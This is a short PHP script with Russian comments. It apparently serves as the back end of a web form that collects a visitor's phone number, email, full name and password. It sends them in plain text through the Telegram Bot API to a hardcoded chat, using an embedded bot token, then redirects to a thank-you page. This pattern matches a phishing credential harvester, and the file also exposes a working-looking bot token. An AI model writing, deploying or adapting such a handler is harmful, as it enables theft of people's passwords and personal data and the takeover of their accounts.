<?php

/* https://api.telegram.org/bot1773711515:AAEo6g2G5XRJZ7k1pwwZYl6OModD0VEsKlQ/getUpdates,
где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */

// поля из формы
$phone = $_POST['userPhone'];
$email = $_POST['mail'];
$name = $_POST['userName'];
$password = $_POST['pass'];

// токен нашего бота из botFather
$token = "1773711515:AAEo6g2G5XRJZ7k1pwwZYl6OModD0VEsKlQ";
// $chat_id = "https://api.telegram.org/botXXXXXXXXXXXXXXXXXXXXXXXXX/getUpdates";
$chat_id = "-527407197";
$arr = array(


  'Моб.телефон: ' => $phone,
  'Эл.почта пользователя: ' => $email,
  'Ф.И.О. пользователя: ' => $name,
  'Пароль пользователя: ' => $password

);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: thank-you.html');
} else {
  echo "Error";
}
?>
